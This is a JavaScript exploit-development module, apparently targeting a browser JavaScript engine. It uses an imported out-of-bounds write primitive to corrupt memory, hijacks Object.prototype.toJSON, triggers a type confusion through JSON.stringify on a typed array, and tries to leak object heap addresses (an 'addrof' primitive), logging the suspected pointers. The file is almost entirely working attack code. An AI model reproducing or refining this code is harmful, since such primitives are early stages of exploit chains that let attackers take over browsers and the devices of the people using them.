// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v10_FinalProbeStateCapture)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V10_FPSC = "OriginalHeisenbug_TypedArrayAddrof_v10_FinalProbeStateCapture";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF;

let last_probe_call_details_v10 = null; 
let object_to_leak_A_v10 = null;
let object_to_leak_B_v10 = null;
let victim_typed_array_ref_v10 = null;

function toJSON_TA_Probe_FinalProbeStateCapture() {
    // This object is local to each call of the probe
    let current_call_details = {
        probe_variant: "TA_Probe_Addrof_v10_FinalProbeStateCapture",
        call_sequence: (last_probe_call_details_v10 && last_probe_call_details_v10.call_sequence ? last_probe_call_details_v10.call_sequence : 0) + 1,
        this_type_in_toJSON: "N/A_before_call",
        error_in_toJSON: null,
        probe_called: true,
        this_is_victim_ref: null,
        this_is_prev_last_probe_details: null, // New: Check if 'this' is the object from previous global state
        writes_attempted_on_this: false
    };
    
    current_call_details.this_is_prev_last_probe_details = (this === last_probe_call_details_v10);

    try {
        current_call_details.this_type_in_toJSON = Object.prototype.toString.call(this);
        current_call_details.this_is_victim_ref = (this === victim_typed_array_ref_v10);
        
        logS3(`[${current_call_details.probe_variant}] Probe Call #${current_call_details.call_sequence}. ` +
              `'this' type: ${current_call_details.this_type_in_toJSON}. ` +
              `'this' === victim_ref? ${current_call_details.this_is_victim_ref}. ` +
              `'this' === prev_last_details_obj? ${current_call_details.this_is_prev_last_probe_details}.`, "leak");

        if (current_call_details.this_type_in_toJSON === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_sequence}: TYPE CONFUSION DETECTED for 'this'.`, "vuln");
            
            logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_sequence}: Attempting addrof writes on this confused 'this'...`, "warn");
            if (object_to_leak_A_v10) {
                this[0] = object_to_leak_A_v10; // Modifies 'this'
                logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_sequence}: Wrote object_to_leak_A_v10 to this[0].`, "info");
            }
            if (object_to_leak_B_v10) {
                this[1] = object_to_leak_B_v10; // Modifies 'this'
                logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_sequence}: Wrote object_to_leak_B_v10 to this[1].`, "info");
            }
            current_call_details.writes_attempted_on_this = true;
        }
    } catch (e) {
        current_call_details.error_in_toJSON = `${e.name}: ${e.message}`;
        logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_sequence}: ERROR in probe: ${e.name} - ${e.message}`, "error");
    }
    
    // CRITICAL: Update the global 'last_probe_call_details_v10' with a *new object*
    // containing the details of *this current call*.
    last_probe_call_details_v10 = { ...current_call_details }; 
    logS3(`[${current_call_details.probe_variant}] Probe Call #${current_call_details.call_sequence} FINISHING. Global 'last_probe_call_details_v10' has been updated. ` +
          `Content: ${JSON.stringify(last_probe_call_details_v10)}`, "dev_verbose");

    return undefined; 
}

export async function executeTypedArrayVictimAddrofTest_FinalProbeStateCapture() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V10_FPSC}.triggerAndAddrof`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (TypedArray, FinalProbeStateCapture) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V10_FPSC} Init...`;

    last_probe_call_details_v10 = null; // Initialize global state
    victim_typed_array_ref_v10 = null; 
    object_to_leak_A_v10 = { marker: "ObjA_TA_v10fpsc", id: Date.now() }; 
    object_to_leak_B_v10 = { marker: "ObjB_TA_v10fpsc", id: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput = null;
    let captured_final_probe_state = null; // Renamed for clarity
    
    let addrof_result_A = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof A @ view[0]: Not attempted or Heisenbug/write failed." };
    let addrof_result_B = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof B @ view[1]: Not attempted or Heisenbug/write failed." };
    
    const fillPattern = 0.10101010101010;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        // ... (OOB init and critical write remain the same)
        logS3("OOB Environment initialized.", "info", FNAME_CURRENT_TEST);
        logS3(`   OOB corruption target in oob_array_buffer_real: ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}`, "info", FNAME_CURRENT_TEST);
        logS3(`STEP 1: Writing CRITICAL value ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE)} to oob_array_buffer_real[${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v10 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        let float64_view_on_underlying_ab = new Float64Array(victim_typed_array_ref_v10.buffer); 
        for(let i = 0; i < float64_view_on_underlying_ab.length; i++) {
            float64_view_on_underlying_ab[i] = fillPattern + i;
        }
        logS3(`STEP 2: victim_typed_array_ref_v10 (Uint8Array) created. View filled.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_TA_Probe_FinalProbeStateCapture,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} polluted.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Calling JSON.stringify(victim_typed_array_ref_v10)...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_typed_array_ref_v10); 
            logS3(`  JSON.stringify completed. Stringify Output (truncated): ${stringifyOutput ? stringifyOutput.substring(0,100) + "..." : 'N/A'}`, "info");
            
            // Capture the state of 'last_probe_call_details_v10' *after* JSON.stringify is fully done.
            // This global variable should now reflect the details from the VERY LAST call to the probe.
            if (last_probe_call_details_v10) {
                captured_final_probe_state = { ...last_probe_call_details_v10 }; 
            }
            logS3(`  CAPTURED FINAL PROBE STATE (copy of global last_probe_call_details_v10): ${captured_final_probe_state ? JSON.stringify(captured_final_probe_state) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbug_confirmed_by_final_state = false;
            if (captured_final_probe_state && 
                captured_final_probe_state.probe_called &&
                captured_final_probe_state.this_type_in_toJSON === "[object Object]") {
                heisenbug_confirmed_by_final_state = true;
                logS3(`  HEISENBUG ON 'this' OF LAST PROBE CALL CONFIRMED! 'this' type: ${captured_final_probe_state.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST);
                logS3(`    Last probe call info: is_victim_ref=${captured_final_probe_state.this_is_victim_ref}, is_prev_details_obj=${captured_final_probe_state.this_is_prev_last_probe_details}, writes_attempted=${captured_final_probe_state.writes_attempted_on_this}`, "info");
            } else {
                let msg = "Heisenbug on 'this' of last probe call NOT confirmed.";
                if(captured_final_probe_state && captured_final_probe_state.this_type_in_toJSON) {
                    msg += ` 'this' type in last probe: ${captured_final_probe_state.this_type_in_toJSON}.`;
                } else { msg += " Captured final probe state is null or probe not called."; }
                logS3(`  ALERT: ${msg}`, "error", FNAME_CURRENT_TEST);
            }
                
            logS3("STEP 3: Checking float64_view_on_underlying_ab...", "warn", FNAME_CURRENT_TEST);
            // ... (addrof checking logic for val_A_double, val_B_double remains the same)
            const val_A_double = float64_view_on_underlying_ab[0];
            addrof_result_A.leaked_address_as_double = val_A_double;
            let temp_buf_A = new ArrayBuffer(8); new Float64Array(temp_buf_A)[0] = val_A_double;
            addrof_result_A.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_buf_A)[0], new Uint32Array(temp_buf_A)[1]);
            logS3(`  Value read from float64_view_on_underlying_ab[0] (for ObjA): ${val_A_double} (${addrof_result_A.leaked_address_as_int64.toString(true)})`, "leak", FNAME_CURRENT_TEST);

            if (val_A_double !== (fillPattern + 0) && val_A_double !== 0 &&
                (addrof_result_A.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_A.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                logS3("  !!!! POTENTIAL POINTER READ at view[0] (ObjA) !!!!", "vuln", FNAME_CURRENT_TEST);
                addrof_result_A.success = true;
                addrof_result_A.message = "Heisenbug (FinalProbeState) observed & view[0] read suggests a pointer for ObjA.";
            } else {
                addrof_result_A.message = "View[0] read does not look like a pointer for ObjA or buffer was unchanged.";
                if (heisenbug_confirmed_by_final_state) addrof_result_A.message = "Heisenbug on 'this' of last probe call observed, but " + addrof_result_A.message;
                if (val_A_double === (fillPattern + 0)) addrof_result_A.message += " (Value matches initial fillPattern)";
            }

            const val_B_double = float64_view_on_underlying_ab[1];
            addrof_result_B.leaked_address_as_double = val_B_double;
            let temp_buf_B = new ArrayBuffer(8); new Float64Array(temp_buf_B)[0] = val_B_double;
            addrof_result_B.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_buf_B)[0], new Uint32Array(temp_buf_B)[1]);
            logS3(`  Value read from float64_view_on_underlying_ab[1] (for ObjB): ${val_B_double} (${addrof_result_B.leaked_address_as_int64.toString(true)})`, "leak", FNAME_CURRENT_TEST);
            
            if (val_B_double !== (fillPattern + 1) && val_B_double !== 0 &&
                (addrof_result_B.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_B.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                logS3("  !!!! POTENTIAL POINTER READ at view[1] (ObjB) !!!!", "vuln", FNAME_CURRENT_TEST);
                addrof_result_B.success = true;
                addrof_result_B.message = "Heisenbug (FinalProbeState) observed & view[1] read suggests a pointer for ObjB.";
            } else {
                addrof_result_B.message = "View[1] read does not look like a pointer for ObjB or buffer was unchanged.";
                 if (heisenbug_confirmed_by_final_state) addrof_result_B.message = "Heisenbug on 'this' of last probe call observed, but " + addrof_result_B.message;
                if (val_B_double === (fillPattern + 1)) addrof_result_B.message += " (Value matches initial fillPattern)";
            }

            if (addrof_result_A.success || addrof_result_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V10_FPSC}: Addr? SUCESSO!`;
            } else if (heisenbug_confirmed_by_final_state) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V10_FPSC}: Heisenbug OK, Addr Falhou`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V10_FPSC}: Heisenbug Falhou?`;
            }

        } catch (e_str) {
            // ... (error handling)
            errorCapturedMain = e_str;
            logS3(`    CRITICAL ERROR during JSON.stringify or addrof logic: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V10_FPSC}: Stringify/Addrof ERR`;
        } finally {
            if (pollutionApplied) {
                Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor || { value: null, writable: true, configurable: true, enumerable: true }); // Restore or delete
                if (!originalToJSONDescriptor) delete Object.prototype[ppKey];
                logS3(`  Object.prototype.${ppKey} restored.`, "info", FNAME_CURRENT_TEST);
            }
        }
    } catch (e_outer_main) {
        // ... (error handling)
        errorCapturedMain = e_outer_main;
        logS3(`OVERALL CRITICAL ERROR in test: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V10_FPSC} CRITICALLY FAILED`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        // ... (final addrof result logging)
        logS3(`Addrof A Result (view[0]): Success=${addrof_result_A.success}, Msg='${addrof_result_A.message}'`, addrof_result_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result_A.leaked_address_as_int64){
            logS3(`  Addrof A (Int64): ${addrof_result_A.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        logS3(`Addrof B Result (view[1]): Success=${addrof_result_B.success}, Msg='${addrof_result_B.message}'`, addrof_result_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result_B.leaked_address_as_int64){
            logS3(`  Addrof B (Int64): ${addrof_result_B.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        
        object_to_leak_A_v10 = null;
        object_to_leak_B_v10 = null;
        victim_typed_array_ref_v10 = null; 
        last_probe_call_details_v10 = null; 
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false, 
        stringifyResult: stringifyOutput, 
        toJSON_details: captured_final_probe_state, // Renamed for clarity
        addrof_A_attempt_result: addrof_result_A,
        addrof_B_attempt_result: addrof_result_B
    };
}
